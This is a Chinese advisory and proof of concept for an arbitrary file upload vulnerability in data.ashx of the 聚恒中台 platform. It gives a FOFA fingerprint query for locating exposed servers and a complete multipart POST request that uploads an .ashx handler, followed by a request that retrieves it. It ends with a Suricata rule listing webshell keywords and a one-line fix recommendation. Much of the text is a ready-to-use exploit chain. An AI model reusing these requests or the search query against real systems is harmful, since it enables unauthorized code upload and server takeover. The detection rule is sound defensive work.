# 山东聚恒网络技术有限公司聚恒中台data.ashx存在任意文件上传漏洞

山东聚恒网络技术有限公司聚恒中台data.ashx存在任意文件上传漏洞

# 影响版本

当下已有版本

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**fofa:**  **icon_hash=&quot;-2049533275&quot; || icon_hash=&quot;-737808640&quot; || icon_hash=&quot;-1557056363&quot;**

**POC/EXP：**

**step1 文件上传**

```
POST /sysplat/dataget/data.ashx?type=voheadfile&key=&ocrtype=&vo=&field=1 HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----geckoformboundary9933b1efc5e0d94a40b1571aebec8742
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko/20100101 Firefox/150.0
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Content-Length: 681918

------geckoformboundary9933b1efc5e0d94a40b1571aebec8742
Content-Disposition: form-data; name="txt_headfile"; filename="hello.ashx"
Content-Type: image/png

<%@ WebHandler Language="C#" Class="Hello" %>
using System.Web;public class Hello:IHttpHandler{public void ProcessRequest(HttpContext c){c.Response.Write("hello");}public bool IsReusable{get{return false;}}}
------geckoformboundary9933b1efc5e0d94a40b1571aebec8742--
```

​![image](assets/image-20260910023050-v7pmcmj.png)​

**step2 读取文件**

```
GET /sysplat/dataget/files/e562facc-64a2-40d7-9f93-6f6acfd5bf5d.ashx HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate


```

​![image](assets/image-20260910023110-7l3ew9d.png)​

**sonrt规则：**

```
alert http any any -> $HOME_NET any (
    msg:"JuHeng 聚恒中台 任意文件上传 - multipart 危险扩展名(aspx/ashx/asp/jsp/jspx/war)含webshell原语";
    flow:to_server,established;
    http.method; content:"POST"; nocase;
    http.content_type; content:"multipart/form-data"; nocase;
    http.client_body;
        content:"filename="; nocase;
        pcre:"/filename=\"[^\"]*\\.(?:aspx|ashx|asmx|asp|jsp|jspx|do|war|phar|php)(?:\\.[a-z0-9]+)?\"/i";
        pcre:"/(?:filename=\"[^\"]*\\.(?:aspx|ashx|asp|jsp|jspx|war|php|phar)\"|Content-Type:\\s*(?:application\\/octet-stream|text\\/html))/i";
    http.client_body;
        pcre:"/(?:<%@?\\s*Page|<%@?\\s*WebHandler|<script\\s*language=|\\bResponse\\.Write\\b|System\\.IO\\.File|ProcessStartInfo|System\\.Diagnostics\\.Process|Runtime\\.getRuntime|ProcessBuilder|@Page\\s+Language=|eval\\s*\(|execute\\s*\(|\\$eval\\(|base64_decode\\()/i";
    metadata:
        service http,
        affected_product "山东聚恒网络 聚恒中台",
        vulnerability_type "Unrestricted File Upload / WebShell",
        reference "QVD-2026-44938",
        severity "critical";
    classtype:web-application-attack;
    sid:1001201;
    rev:1;
    priority:1;
)
```

# 漏洞修复

建议用户更新至最新补丁

‍
